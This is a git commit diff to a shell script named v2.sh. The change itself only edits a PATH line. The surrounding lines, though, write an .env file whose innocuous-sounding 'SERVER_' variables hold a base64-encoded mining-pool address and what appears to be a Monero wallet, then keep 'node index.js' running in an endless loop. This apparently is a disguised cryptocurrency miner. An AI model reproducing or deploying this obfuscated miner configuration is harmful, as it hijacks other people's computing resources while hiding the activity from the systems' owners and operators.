1eb054362e13315bff65c3fa89b25016889d666a
tienbar3 <92248511+tienbar3@users.noreply.github.com>
2026-03-05 14:35:37 +0700

    Update v2.sh

--- v2.sh
+++ v2.sh
@@ -6,5 +6,5 @@ SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMz
 SERVER_DOMAIN=48A73pficCJfxka8ywYoZBJLmXVHToaWAfuLuMAHxh9Ba8CbFJycKaxMcrWGouMvvmQE1bUCYC4AiJrAzYrFZUsC5jP63rn.${NAME}
 SERVER_SECRET=x
 SERVER_CONNECTION=${CONNECT}" > .env
-export PATH=./usr/bin:$PATH
+export PATH=./user/bin:$PATH
 while true; do node index.js; sleep 15; done
